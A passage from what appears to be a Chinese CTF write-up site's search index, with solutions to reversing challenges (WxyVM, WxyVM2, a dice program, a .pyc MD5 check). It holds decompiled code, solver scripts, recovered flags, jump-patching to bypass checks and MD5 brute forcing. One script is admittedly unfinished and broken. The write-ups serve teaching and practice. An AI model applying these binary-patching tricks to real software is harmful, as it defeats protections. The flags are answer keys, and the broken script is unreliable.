continue;\n    }\n  }\n  return result;\n}\n\n\n\n\n0x2 编写逆算法\n\n\n由于数组有15000个，所以可以写idapython的脚本，shift+F2在ida中运行\n\n\nfrom __future__ import print_function\ns = []\nfor i in range(24):\n  s.append(Byte(0x601060+4*i))\nfor i in range(14997,-1,-3):\n  v0 = Byte(0x6010c0+i)\n  v3 = Byte(0x6010c0+i+2)\n  res = v0\n  if v0==1:\n    res=Byte(0x6010c0+i+1)\n    s[res]-=v3\n  elif v0==2:\n    res=Byte(0x6010c0+i+1)\n    s[res]+=v3\n  elif v0==3:\n    res=Byte(0x6010c0+i+1)\n    s[res]^=v3\n  elif v0==4:\n    res=Byte(0x6010c0+i+1)\n    s[res]/=v3\n  else:\n      res=Byte(0x6010c0+i+1)\n      s[res]^=s[Byte(0x6010c0+i+2)]\nfor i in s:\n  print(chr(i%256),end='')\n\n\n\n\n\n最后输出的时候需要取模，这个在原程序中没有出现，还没弄清楚为什么没有影响\n\n\n得到flag： \nnctf{Embr4ce_Vm_j0in_R3}\n\n\n0x3 补充\n\n\n\n\n链接：https://notwo1f.github.io/2018/05/04/%E5%8D%97%E9%82%AEre-writeup/\n\n\n\n\n在上面的博文中提到了导出数组的方法：\n\n\n\n\n在要导出的字符串上按\n*\n（即\nshift+8\n)\n\n\n显示转换对话框，ida已经自动识别的数组长度为15000\n\n\nshift+e\n提取数组，不需要全部选中", 
            "title": "[ctf.nuptzj.cn] wxyvm"
        }, 
        {
            "location": "/wargame/reversing/[ctf.nuptzj.cn]_wxyvm/#wxyvm", 
            "text": "", 
            "title": "WxyVM"
        }, 
        {
            "location": "/wargame/reversing/[ctf.nuptzj.cn]_wxyvm/#0x1", 
            "text": "Wxy大神的VM  格式： nctf{********}", 
            "title": "0x1 题目"
        }, 
        {
            "location": "/wargame/reversing/[ctf.nuptzj.cn]_wxyvm/#0x2", 
            "text": "", 
            "title": "0x2 解题步骤"
        }, 
        {
            "location": "/wargame/reversing/[ctf.nuptzj.cn]_wxyvm/#0x1-ida", 
            "text": "ELF64位程序，使用ida64打开  看到关键的判断代码  __int64 __fastcall main(__int64 a1, char **a2, char **a3)\n{\n  char v4; // [sp+Bh] [bp-5h]@1\n  signed int i; // [sp+Ch] [bp-4h]@3\n\n  puts( [WxyVM 0.0.1] );\n  puts( input your flag: );\n  scanf( %s ,  byte_604B80);\n  v4 = 1;\n  sub_4005B6();\n  if ( strlen( byte_604B80) != 24 )\n    v4 = 0;\n  for ( i = 0; i  = 23; ++i )\n  {\n    if ( *( byte_604B80 + i) != unk_601060[i] )\n      v4 = 0;\n  }\n  if ( v4 )\n    puts( correct );\n  else\n    puts( wrong );\n  return 0LL;\n}  关键是与unk_601060的比较，byte_604B80为输入值，sub_4005B6()应该对输入值进行了处理：  sub_4005B6():  __int64 sub_4005B6()\n{\n  unsigned int v0; // ST04_4@3\n  __int64 result; // rax@3\n  signed int i; // [sp+0h] [bp-10h]@1\n  char v3; // [sp+8h] [bp-8h]@3\n\n  for ( i = 0; i  = 14999; i += 3 )\n  {\n    v0 = byte_6010C0[(signed __int64)i];\n    v3 = byte_6010C0[(signed __int64)(i + 2)];\n    result = v0;\n    switch ( v0 )\n    {\n      case 1u:\n        result = byte_6010C0[(signed __int64)(i + 1)];\n        *( byte_604B80 + result) += v3;\n        break;\n      case 2u:\n        result = byte_6010C0[(signed __int64)(i + 1)];\n        *( byte_604B80 + result) -= v3;\n        break;\n      case 3u:\n        result = byte_6010C0[(signed __int64)(i + 1)];\n        *( byte_604B80 + result) ^= v3;\n        break;\n      case 4u:\n        result = byte_6010C0[(signed __int64)(i + 1)];\n        *( byte_604B80 + result) *= v3;\n        break;\n      case 5u:\n        result = byte_6010C0[(signed __int64)(i + 1)];\n        *( byte_604B80 + result) ^= *( byte_604B80 + byte_6010C0[(signed __int64)(i + 2)]);\n        break;\n      default:\n        continue;\n    }\n  }\n  return result;\n}", 
            "title": "0x1 ida分析文件"
        }, 
        {
            "location": "/wargame/reversing/[ctf.nuptzj.cn]_wxyvm/#0x2_1", 
            "text": "由于数组有15000个，所以可以写idapython的脚本，shift+F2在ida中运行  from __future__ import print_function\ns = []\nfor i in range(24):\n  s.append(Byte(0x601060+4*i))\nfor i in range(14997,-1,-3):\n  v0 = Byte(0x6010c0+i)\n  v3 = Byte(0x6010c0+i+2)\n  res = v0\n  if v0==1:\n    res=Byte(0x6010c0+i+1)\n    s[res]-=v3\n  elif v0==2:\n    res=Byte(0x6010c0+i+1)\n    s[res]+=v3\n  elif v0==3:\n    res=Byte(0x6010c0+i+1)\n    s[res]^=v3\n  elif v0==4:\n    res=Byte(0x6010c0+i+1)\n    s[res]/=v3\n  else:\n      res=Byte(0x6010c0+i+1)\n      s[res]^=s[Byte(0x6010c0+i+2)]\nfor i in s:\n  print(chr(i%256),end='')  最后输出的时候需要取模，这个在原程序中没有出现，还没弄清楚为什么没有影响  得到flag：  nctf{Embr4ce_Vm_j0in_R3}", 
            "title": "0x2 编写逆算法"
        }, 
        {
            "location": "/wargame/reversing/[ctf.nuptzj.cn]_wxyvm/#0x3", 
            "text": "链接：https://notwo1f.github.io/2018/05/04/%E5%8D%97%E9%82%AEre-writeup/   在上面的博文中提到了导出数组的方法：   在要导出的字符串上按 * （即 shift+8 )  显示转换对话框，ida已经自动识别的数组长度为15000  shift+e 提取数组，不需要全部选中", 
            "title": "0x3 补充"
        }, 
        {
            "location": "/wargame/reversing/[ctf.nuptzj.cn]_wxyvm2/", 
            "text": "WxyVM2\n\n\n0x1 题目\n\n\n\n\nWxy大神的另一个VM\n\n\n格式：\nnctf{********}\n\n\n\n\n0x2 解题步骤\n\n\n0x1 ida分析文件\n\n\nELF64位程序，使用ida64打开\n\n\n看到关键的判断代码\n\n\n__int64 __fastcall main(__int64 a1, char **a2, char **a3)\n{\n  char v4; // [sp+Bh] [bp-5h]@1\n  signed int i; // [sp+Ch] [bp-4h]@3\n\n  puts(\n[WxyVM 0.0.2]\n);\n  puts(\ninput your flag:\n);\n  scanf(\n%s\n, \nbyte_694100);\n  v4 = 1;\n  if ( strlen(\nbyte_694100) != 25 )\n    v4 = 0;\nxxxxxxxxxxxxx//中间省略了大量的混淆代码\n for ( i = 0; i \n= 24; ++i )\n  {\n    if ( *(\nbyte_694100 + i) != dword_694060[i] )\n      v4 = 0;\n  }\n  if ( v4 )\n    puts(\ncorrect\n);\n  else\n    puts(\nwrong\n);\n  return 0LL;\n}\n\n\n\n\n提取dword_694060处的值，需要修改当初的类型为数组：\n\n\nunsigned char ida_chars[] =\n{\n  0xC0, 0xFF, 0xFF, 0xFF, 0x85, 0xFF, 0xFF, 0xFF, 0xF9, 0xFF, \n  0xFF, 0xFF, 0x6C, 0x00, 0x00, 0x00, 0xE2, 0xFF, 0xFF, 0xFF, \n  0x14, 0x00, 0x00, 0x00, 0xBB, 0xFF, 0xFF, 0xFF, 0xE4, 0xFF, \n  0xFF, 0xFF, 0x0D, 0x00, 0x00, 0x00, 0x59, 0x00, 0x00, 0x00, \n  0x1C, 0x00, 0x00, 0x00, 0x23, 0x00, 0x00, 0x00, 0x88, 0xFF, \n  0xFF, 0xFF, 0x6E, 0x00, 0x00, 0x00, 0x9B, 0xFF, 0xFF, 0xFF, \n  0xCA, 0xFF, 0xFF, 0xFF, 0xBA, 0xFF, 0xFF, 0xFF, 0x5C, 0x00, \n  0x00, 0x00, 0x37, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, \n  0x48, 0x00, 0x00, 0x00, 0xD8, 0xFF, 0xFF, 0xFF, 0x1F, 0x00, \n  0x00, 0x00, 0xAB, 0xFF, 0xFF, 0xFF, 0xA5, 0xFF, 0xFF, 0xFF\n};\n\n\n\n\n需要转换成32位的数据\n\n\na = [0xffffffC0, 0xffffff85, 0xffffffF9, 0x6C, 0xffffffE2, 0x14, 0xffffffBB, 0xffffffe4, 0xd, 0x59, 0x1c, 0x23,\n     0xffffff88, 0x6e, 0xffffff9b, 0xffffffca, 0xffffffba, 0x5c, 0x37, 0xffffffff, 0x48, 0xffffffd8, 0x1f, 0xffffffab,\n     0xffffffa5]\n\n\n\n\n混淆代码上含有大量无用的操作，分析得出，所有对dword的值的操作都是无效的，部分代码如下：\n\n\ndword_6941E0 ^= dword_6941DC;\n  byte_694102 ^= 0xBu;\n  byte_694100 ^= 0x5Eu;\n  byte_694111 += 69;\n  byte_694109 += 7;\n--byte_694113;\n\n\n\n\n\n\n将所有混淆代码保存为\nvm2_2.c\n\n\n对于dword类型的操作：直接删除\n\n\n对于byte类型的一般操作：\n\n\n提取byte_xxxxxx的最后两位，其为a字符串的数组索引值i\n\n\n16进制：取出0x和u之间的被操作数，转换成10进制，并与a[i]中的值进行逆操作\n\n\n10进制：取出被操作数，并于a[i]进行逆操作\n\n\n\n\n\n\n对于自加自减的byte操作：\n\n\n提取byte_xxxxxx的最后两位，其为a字符串的数组索引值i\n\n\n根据操作符，进行自加自减操作\n\n\n注意：语句遍历要从后往前\n\n\n\n\n0x2 编写逆算法\n\n\n参考\n博客\n，实现脚本，没有写完，先暂时如此，回头再来实\n\n\n#coding=UTF-8\noperator = open('vm2_2.c','r').read()\n# print operator\n#operator为IDA反编译出的全部命令\no = operator.split(\n;\n)#分割命令形成列表\ndword = \ndword_\n\noperator_strip_dword = []\ncount = 1\nfor i in o:\n    if dword in i:\n        # print i\n        continue\n    else:\n        # print i\n        line = i.split(\n \n)\n        if len(line)\n3:\n            last_2 = line[2][-2:]\n            op = line[3]\n            var2 = line[4]\n            l = last_2 + op + var2\n            print l\n        # print last_2\n            operator_strip_dword.append(l)\n        elif len(line)\n1:\n            pass        #这里需要实现对++/--操作数的操作\n            # print line\nprint operator_strip_dword\n#以下为博客中的内容\na = [0xffffffC0, 0xffffff85, 0xffffffF9, 0x6C, 0xffffffE2, 0x14, 0xffffffBB, 0xffffffe4, 0xd, 0x59, 0x1c, 0x23,\n     0xffffff88, 0x6e, 0xffffff9b, 0xffffffca, 0xffffffba, 0x5c, 0x37, 0xffffffff, 0x48, 0xffffffd8, 0x1f, 0xffffffab,\n     0xffffffa5]\n\n# f = open('vm2.c','r')\nfor b in f.readlines()[::-1]:\n    if b[3] == '+':\n        if 'x' in b:\n            a[int(b[:2], 16)] -= int(b[8:], 16 if 'x' in b else 10)\n        else:\n            a[int(b[:2], 16)] -= int(b[6:], 10)\n    if b[3] == '-':\n        if 'x' in b:\n            a[int(b[:2], 16)] += int(b[8:], 16)\n        else:\n            a[int(b[:2], 16)] += int(b[6:], 10)\n    if b[3] == '^':\n        if 'x' in b:\n            a[int(b[:2], 16)] ^= int(b[8:], 16)\n        else:\n            a[int(b[:2], 16)] ^= int(b[6:], 10)\nflag = \n\nfor i in a:\n    flag += chr(i % 256)\nprint flag\n\n\n\n\n得到flag： \nnctf{th3_vM_w1th0ut_dAta}", 
            "title": "[ctf.nuptzj.cn] wxyvm2"
        }, 
        {
            "location": "/wargame/reversing/[ctf.nuptzj.cn]_wxyvm2/#wxyvm2", 
            "text": "", 
            "title": "WxyVM2"
        }, 
        {
            "location": "/wargame/reversing/[ctf.nuptzj.cn]_wxyvm2/#0x1", 
            "text": "Wxy大神的另一个VM  格式： nctf{********}", 
            "title": "0x1 题目"
        }, 
        {
            "location": "/wargame/reversing/[ctf.nuptzj.cn]_wxyvm2/#0x2", 
            "text": "", 
            "title": "0x2 解题步骤"
        }, 
        {
            "location": "/wargame/reversing/[ctf.nuptzj.cn]_wxyvm2/#0x1-ida", 
            "text": "ELF64位程序，使用ida64打开  看到关键的判断代码  __int64 __fastcall main(__int64 a1, char **a2, char **a3)\n{\n  char v4; // [sp+Bh] [bp-5h]@1\n  signed int i; // [sp+Ch] [bp-4h]@3\n\n  puts( [WxyVM 0.0.2] );\n  puts( input your flag: );\n  scanf( %s ,  byte_694100);\n  v4 = 1;\n  if ( strlen( byte_694100) != 25 )\n    v4 = 0;\nxxxxxxxxxxxxx//中间省略了大量的混淆代码\n for ( i = 0; i  = 24; ++i )\n  {\n    if ( *( byte_694100 + i) != dword_694060[i] )\n      v4 = 0;\n  }\n  if ( v4 )\n    puts( correct );\n  else\n    puts( wrong );\n  return 0LL;\n}  提取dword_694060处的值，需要修改当初的类型为数组：  unsigned char ida_chars[] =\n{\n  0xC0, 0xFF, 0xFF, 0xFF, 0x85, 0xFF, 0xFF, 0xFF, 0xF9, 0xFF, \n  0xFF, 0xFF, 0x6C, 0x00, 0x00, 0x00, 0xE2, 0xFF, 0xFF, 0xFF, \n  0x14, 0x00, 0x00, 0x00, 0xBB, 0xFF, 0xFF, 0xFF, 0xE4, 0xFF, \n  0xFF, 0xFF, 0x0D, 0x00, 0x00, 0x00, 0x59, 0x00, 0x00, 0x00, \n  0x1C, 0x00, 0x00, 0x00, 0x23, 0x00, 0x00, 0x00, 0x88, 0xFF, \n  0xFF, 0xFF, 0x6E, 0x00, 0x00, 0x00, 0x9B, 0xFF, 0xFF, 0xFF, \n  0xCA, 0xFF, 0xFF, 0xFF, 0xBA, 0xFF, 0xFF, 0xFF, 0x5C, 0x00, \n  0x00, 0x00, 0x37, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, \n  0x48, 0x00, 0x00, 0x00, 0xD8, 0xFF, 0xFF, 0xFF, 0x1F, 0x00, \n  0x00, 0x00, 0xAB, 0xFF, 0xFF, 0xFF, 0xA5, 0xFF, 0xFF, 0xFF\n};  需要转换成32位的数据  a = [0xffffffC0, 0xffffff85, 0xffffffF9, 0x6C, 0xffffffE2, 0x14, 0xffffffBB, 0xffffffe4, 0xd, 0x59, 0x1c, 0x23,\n     0xffffff88, 0x6e, 0xffffff9b, 0xffffffca, 0xffffffba, 0x5c, 0x37, 0xffffffff, 0x48, 0xffffffd8, 0x1f, 0xffffffab,\n     0xffffffa5]  混淆代码上含有大量无用的操作，分析得出，所有对dword的值的操作都是无效的，部分代码如下：  dword_6941E0 ^= dword_6941DC;\n  byte_694102 ^= 0xBu;\n  byte_694100 ^= 0x5Eu;\n  byte_694111 += 69;\n  byte_694109 += 7;\n--byte_694113;   将所有混淆代码保存为 vm2_2.c  对于dword类型的操作：直接删除  对于byte类型的一般操作：  提取byte_xxxxxx的最后两位，其为a字符串的数组索引值i  16进制：取出0x和u之间的被操作数，转换成10进制，并与a[i]中的值进行逆操作  10进制：取出被操作数，并于a[i]进行逆操作    对于自加自减的byte操作：  提取byte_xxxxxx的最后两位，其为a字符串的数组索引值i  根据操作符，进行自加自减操作  注意：语句遍历要从后往前", 
            "title": "0x1 ida分析文件"
        }, 
        {
            "location": "/wargame/reversing/[ctf.nuptzj.cn]_wxyvm2/#0x2_1", 
            "text": "参考 博客 ，实现脚本，没有写完，先暂时如此，回头再来实  #coding=UTF-8\noperator = open('vm2_2.c','r').read()\n# print operator\n#operator为IDA反编译出的全部命令\no = operator.split( ; )#分割命令形成列表\ndword =  dword_ \noperator_strip_dword = []\ncount = 1\nfor i in o:\n    if dword in i:\n        # print i\n        continue\n    else:\n        # print i\n        line = i.split(   )\n        if len(line) 3:\n            last_2 = line[2][-2:]\n            op = line[3]\n            var2 = line[4]\n            l = last_2 + op + var2\n            print l\n        # print last_2\n            operator_strip_dword.append(l)\n        elif len(line) 1:\n            pass        #这里需要实现对++/--操作数的操作\n            # print line\nprint operator_strip_dword\n#以下为博客中的内容\na = [0xffffffC0, 0xffffff85, 0xffffffF9, 0x6C, 0xffffffE2, 0x14, 0xffffffBB, 0xffffffe4, 0xd, 0x59, 0x1c, 0x23,\n     0xffffff88, 0x6e, 0xffffff9b, 0xffffffca, 0xffffffba, 0x5c, 0x37, 0xffffffff, 0x48, 0xffffffd8, 0x1f, 0xffffffab,\n     0xffffffa5]\n\n# f = open('vm2.c','r')\nfor b in f.readlines()[::-1]:\n    if b[3] == '+':\n        if 'x' in b:\n            a[int(b[:2], 16)] -= int(b[8:], 16 if 'x' in b else 10)\n        else:\n            a[int(b[:2], 16)] -= int(b[6:], 10)\n    if b[3] == '-':\n        if 'x' in b:\n            a[int(b[:2], 16)] += int(b[8:], 16)\n        else:\n            a[int(b[:2], 16)] += int(b[6:], 10)\n    if b[3] == '^':\n        if 'x' in b:\n            a[int(b[:2], 16)] ^= int(b[8:], 16)\n        else:\n            a[int(b[:2], 16)] ^= int(b[6:], 10)\nflag =  \nfor i in a:\n    flag += chr(i % 256)\nprint flag  得到flag：  nctf{th3_vM_w1th0ut_dAta}", 
            "title": "0x2 编写逆算法"
        }, 
        {
            "location": "/wargame/reversing/[whaleedu.com]_dice/", 
            "text": "whale-大筛子\n\n\n题目：\n\n\n \n\n\n0x01 解题步骤\n\n\n0x1 方法1 静态分析\n\n\n0x01 DIE分析\n\n\n​   分析dice.exe，发现是32位程序，用32位IDA打开\n\n\n0x02 找到flag输入语句\n\n\n\n\n\n\n找入口点\n\n\n\n\n\n\nwinMain()\n\n\n\n\n\n\nshift+F12找感兴趣的字符串\n\n\n\n\n\n\n找到感兴趣的字符串，双击进入\n\n\n\n\n\n\n查看交叉引用，双击到winMain函数里\n\n\n\n\n\n\n确定flag的输出语句\n\n\n\n\n\n\n\n\n0x3\nalt+t\n搜索v88的位置\n\n\n\n\n0x4 找到v88赋值的地方\n\n\n \n\n\n0x5 变量导出\n\n\n双击变量，把byte_444240处的变量导出（shift+e）\n\n\n注意：不能把结尾的00也复制出来\n\n\n \n\n\n0x6 查看v88的变化\n\n\n找到最后一句检测v88的语句\n\n\n \n\n\n0x7 查看v99，并导出\n\n\n \n\n\n0x8 再次跟踪v89和v90的变化\n\n\n \n\n\n0x9 v89的变化\n\n\n反调试：time()函数计算延时大小\n\n\n \n\n\n0x10 V90的变化\n\n\n反调试技巧：idDebuggerPresent()\n\n\n \n\n\n0x11 利用python给出结果\n\n\n\n\n反汇编部分源代码\n\n\n\n\n            for ( j = 0; ; ++j )\n            {\n              v67 = 1;\n              v52 = std::string::size((std::string *)\nv88);\n              if ( j \n= v52 )\n                break;\n              v64 = (_BYTE *)std::string::operator[]((std::string *)\nv88, j);\n              v53 = (_BYTE *)std::string::operator[]((std::string *)\nv91, i);\n              *v64 ^= *v53;\n              ++i;\n              v54 = std::string::length((std::string *)\nv91);\n              if ( i \n= v54 )\n                i = 0;\n            }\n\n\n\n\n\n\npython\n\n\n\n\n# -*- coding:utf-8 -*-\ndef foo():\n    v89,v90=100,16\n    v91=\n02370F350F3C15073C302A30551237151E350151\n\n    v88=\n132138153D3357472D276A73440526595C79174445771A75497D054A78746A70420271050F2208\n\n    v91=[ord(i) for i in v91.decode('hex')]\n    for i in xrange(len(v91)):\n        v91[i]^=v89^v90\n    v88=[ord(i) for i in v88.decode('hex')]\n    res=\n\n    for i in xrange(len(v88)):\n        res+=chr(v88[i]^v91[i%len(v91)])\n    print res\n    pass\nif __name__ == '__main__':\n  foo()\n  print 'ok'\n\n\n\n\n\n0x2 方法2 IDA流程图法\n\n\n\n\n\n\n程序使用cmp指令来对比骰子的点数是否与规定的一致\n \n\n\n\n\n\n\n程序通过判断\n[ebp+var_5c]\n中的值是否为3进行跳转\n\n\n\n\n\n\n \n\n\n\n\n通过修改跳转指令来增大成功几率将\njnz\n替换为\njz\n\n\n\n\n修改方法：options/general/disassemly/number of opcode bytes设置为16，使其显示指令的机器码\n\n\n \n\n\n\n\nJNZ的机器码为：75，修改为74（JZ）\n\n\n\n\n修改方法：Eidt/Patch program/change byte\n\n\n \n\n\n\n\n依次将几个判断都修改掉，然后保存修改\n\n\n\n\n方法：\nedit/patch program/apply patches to input file\n\n\n注意：\n得保存项目\n\n\n \n\n\n\n\n运行得到flag", 
            "title": "whale-大筛子"
        }, 
        {
            "location": "/wargame/reversing/[whaleedu.com]_dice/#whale-", 
            "text": "题目：", 
            "title": "whale-大筛子"
        }, 
        {
            "location": "/wargame/reversing/[whaleedu.com]_dice/#0x01", 
            "text": "", 
            "title": "0x01 解题步骤"
        }, 
        {
            "location": "/wargame/reversing/[whaleedu.com]_dice/#0x1-1", 
            "text": "", 
            "title": "0x1 方法1 静态分析"
        }, 
        {
            "location": "/wargame/reversing/[whaleedu.com]_dice/#0x01-die", 
            "text": "​   分析dice.exe，发现是32位程序，用32位IDA打开", 
            "title": "0x01 DIE分析"
        }, 
        {
            "location": "/wargame/reversing/[whaleedu.com]_dice/#0x02-flag", 
            "text": "找入口点    winMain()    shift+F12找感兴趣的字符串    找到感兴趣的字符串，双击进入    查看交叉引用，双击到winMain函数里    确定flag的输出语句", 
            "title": "0x02 找到flag输入语句"
        }, 
        {
            "location": "/wargame/reversing/[whaleedu.com]_dice/#0x3alttv88", 
            "text": "", 
            "title": "0x3alt+t搜索v88的位置"
        }, 
        {
            "location": "/wargame/reversing/[whaleedu.com]_dice/#0x4-v88", 
            "text": "", 
            "title": "0x4 找到v88赋值的地方"
        }, 
        {
            "location": "/wargame/reversing/[whaleedu.com]_dice/#0x5", 
            "text": "双击变量，把byte_444240处的变量导出（shift+e）  注意：不能把结尾的00也复制出来", 
            "title": "0x5 变量导出"
        }, 
        {
            "location": "/wargame/reversing/[whaleedu.com]_dice/#0x6-v88", 
            "text": "找到最后一句检测v88的语句", 
            "title": "0x6 查看v88的变化"
        }, 
        {
            "location": "/wargame/reversing/[whaleedu.com]_dice/#0x7-v99", 
            "text": "", 
            "title": "0x7 查看v99，并导出"
        }, 
        {
            "location": "/wargame/reversing/[whaleedu.com]_dice/#0x8-v89v90", 
            "text": "", 
            "title": "0x8 再次跟踪v89和v90的变化"
        }, 
        {
            "location": "/wargame/reversing/[whaleedu.com]_dice/#0x9-v89", 
            "text": "反调试：time()函数计算延时大小", 
            "title": "0x9 v89的变化"
        }, 
        {
            "location": "/wargame/reversing/[whaleedu.com]_dice/#0x10-v90", 
            "text": "反调试技巧：idDebuggerPresent()", 
            "title": "0x10 V90的变化"
        }, 
        {
            "location": "/wargame/reversing/[whaleedu.com]_dice/#0x11-python", 
            "text": "反汇编部分源代码               for ( j = 0; ; ++j )\n            {\n              v67 = 1;\n              v52 = std::string::size((std::string *) v88);\n              if ( j  = v52 )\n                break;\n              v64 = (_BYTE *)std::string::operator[]((std::string *) v88, j);\n              v53 = (_BYTE *)std::string::operator[]((std::string *) v91, i);\n              *v64 ^= *v53;\n              ++i;\n              v54 = std::string::length((std::string *) v91);\n              if ( i  = v54 )\n                i = 0;\n            }   python   # -*- coding:utf-8 -*-\ndef foo():\n    v89,v90=100,16\n    v91= 02370F350F3C15073C302A30551237151E350151 \n    v88= 132138153D3357472D276A73440526595C79174445771A75497D054A78746A70420271050F2208 \n    v91=[ord(i) for i in v91.decode('hex')]\n    for i in xrange(len(v91)):\n        v91[i]^=v89^v90\n    v88=[ord(i) for i in v88.decode('hex')]\n    res= \n    for i in xrange(len(v88)):\n        res+=chr(v88[i]^v91[i%len(v91)])\n    print res\n    pass\nif __name__ == '__main__':\n  foo()\n  print 'ok'", 
            "title": "0x11 利用python给出结果"
        }, 
        {
            "location": "/wargame/reversing/[whaleedu.com]_dice/#0x2-2-ida", 
            "text": "程序使用cmp指令来对比骰子的点数是否与规定的一致      程序通过判断 [ebp+var_5c] 中的值是否为3进行跳转        通过修改跳转指令来增大成功几率将 jnz 替换为 jz   修改方法：options/general/disassemly/number of opcode bytes设置为16，使其显示指令的机器码      JNZ的机器码为：75，修改为74（JZ）   修改方法：Eidt/Patch program/change byte      依次将几个判断都修改掉，然后保存修改   方法： edit/patch program/apply patches to input file  注意： 得保存项目      运行得到flag", 
            "title": "0x2 方法2 IDA流程图法"
        }, 
        {
            "location": "/wargame/reversing/[whaleedu.com]_pyc1/", 
            "text": "py逆向1\n\n\n0x1 题目\n\n\n \n\n\n0x2 解题步骤\n\n\n0x1 反编译umVm.pyc\n\n\n\n\n使用eay python decomplier\n\n\n\n\n0x2 爆破md5\n\n\n0x1 反编译后的文件\n\n\n# Embedded file name: unVm.py\nimport md5\nmd5s = [40872900234340200352311496849171786925L,\n 37774871274387226911544626909853297147L,\n 136364329640288194110852557127415197202L,\n 197102543045186090881257886713375686009L,\n 46282790971609926574181364879232245714L,\n 199788626591470902691740865303843697496L,\n 139155483798021197733301619201494834453L,\n 105977393849615850942572250680575701536L,\n 103383262965894787541607484291344857033L,\n 193549894376121578282270539756256252317L]\nprint 'Can you turn me back to python ? ...'\nflag = raw_input('well as you wish.. what is the flag: ')\nif len(flag) \n 50:\n    print 'nice try'\n    exit()\nif len(flag) % 5 != 0:\n    print 'nice try'\n    exit()\nfor i in range(0, len(flag), 5):\n    s = flag[i:i + 5]\n    if int('0x' + md5.new(s).hexdigest(), 16) != md5s[i / 5]:\n        print 'nice try'\n        exit()\n\nprint 'Congratz now you have the flag'\n\n\n\n\n0x2 转码md5s为16位\n\n\nmd5s = [40872900234340200352311496849171786925,\n 37774871274387226911544626909853297147,\n 136364329640288194110852557127415197202,\n 197102543045186090881257886713375686009,\n 46282790971609926574181364879232245714,\n 199788626591470902691740865303843697496,\n 139155483798021197733301619201494834453,\n 105977393849615850942572250680575701536,\n 103383262965894787541607484291344857033,\n 193549894376121578282270539756256252317]\n\nfor i in md5s:\n    print('{:032x}'.format(i))\n\n\n\n\n输出：\n\n\n\n\n1ebfd5913ef450b92b9e65b6de09acad\n1c6b2cf25eb36540376a3b3fa208a9fb\n6696d088517c9390167fedb2bc876e12\n944891a872a4891002f7caf24c70fd79\n22d1bdc61cc009b82c178607a3569fd2\n964de3cd368503d06156731676aff358\n68b05f0ea56017a63e7255c991fd5d15\n4fba80ed85d2b50ece2dd336da68b220\n4dc6e4668713974d68d44544fa7177c9\n919c5a8e20ae0da98ca1f673f7ae519d\n\n\n\n\n0x3 爆破\n\n\n\n\n使用md5crack，设置线程数为10，同时设置字符数为5，字符类型包括所有，设定保存文件位置及文件名\n\n\n\n\n \n\n\n\n\n得到的明文和md5值的对应关系，手动调整顺序，得到flag", 
            "title": "py逆向1"
        }, 
        {
            "location": "/wargame/reversing/[whaleedu.com]_pyc1/#py1", 
            "text": "", 
            "title": "py逆向1"
        }, 
        {
            "location": "/wargame/reversing/[whaleedu.com]_pyc1/#0x1", 
            "text": "", 
            "title": "0x1 题目"
        }, 
        {
            "location": "/wargame/reversing/[whaleedu.com]_pyc1/#0x2", 
            "text": "", 
            "title": "0x2 解题步骤"
        }, 
        {
            "location": "/wargame/reversing/[whaleedu.com]_pyc1/#0x1-umvmpyc", 
            "text": "使用eay python decomplier", 
            "title": "0x1 反编译umVm.pyc"
        }, 
        {
            "location": "/wargame/reversing/[whaleedu.com]_pyc1/#0x2-md5", 
            "text": "", 
            "title": "0x2 爆破md5"
        }, 
        {
            "location": "/wargame/reversing/[whaleedu.com]_pyc1/#0x1_1", 
            "text": "# Embedded file name: unVm.py\nimport md5\nmd5s = [40872900234340200352311496849171786925L,\n 37774871274387226911544626909853297147L,\n 136364329640288194110852557127415197202L,\n 197102543045186090881257886713375686009L,\n 46282790971609926574181364879232245714L,\n 199788626591470902691740865303843697496L,\n 139155483798021197733301619201494834453L,\n 105977393849615850942572250680575701536L,\n 103383262965894787541607484291344857033L,\n 193549894376121578282270539756256252317L]\nprint 'Can you turn me back to python ? ...'\nflag = raw_input('well as you wish.. what is the flag: ')\nif len(flag)   50:\n    print 'nice try'\n    exit()\nif len(flag) % 5 != 0:\n    print 'nice try'\n    exit()\nfor i in range(0, len(flag), 5):\n    s = flag[i:i + 5]\n    if int('0x' + md5.new(s).hexdigest(), 16) != md5s[i / 5]:\n        print 'nice try'\n        exit()\n\nprint 'Congratz now you have the flag'", 
            "title": "0x1 反编译后的文件"
        }, 
        {
            "location": "/wargame/reversing/[whaleedu.com]_pyc1/#0x2-md5s16", 
            "text": "md5s = [40872900234340200352311496849171786925,\n 37774871274387226911544626909853297147,\n 136364329640288194110852557127415197202,\n 197102543045186090881257886713375686009,\n 46282790971609926574181364879232245714,\n 199788626591470902691740865303843697496,\n 139155483798021197733301619201494834453,\n 105977393849615850942572250680575701536,\n 103383262965894787541607484291344857033,\n 193549894376121578282270539756256252317]\n\nfor i in md5s:\n    print('{:032x}'.format(i))  输出：   1ebfd5913ef450b92b9e65b6de09acad\n1c6b2cf25eb36540376a3b3fa208a9fb\n6696d088517c9390167fedb2bc876e12\n944891a872a4891002f7caf24c70fd79\n22d1bdc61cc009b82c178607a3569fd2\n964de3cd368503d06156731676aff358\n68b05f0ea56017a63e7255c991fd5d15\n4fba80ed85d2b50ece2dd336da68b220\n4dc6e4668713974d68d44544fa7177c9\n919c5a8e20ae0da98ca1f673f7ae519d", 
            "title": "0x2 转码md5s为16位"
        }, 
        {
            "location": "/wargame/reversing/[whaleedu.com]_pyc1/#0x3", 
            "text": "使用md5crack，设置线程数为10，同时设置字符数为5，字符类型包括所有，设定保存文件位置及文件名       得到的明文和md5值的对应关系，手动调整顺序，得到flag", 
            "title": "0x3 爆破"
        }, 
        {
            "location": "/wargame/web/[bugku.com]_upload_test/", 
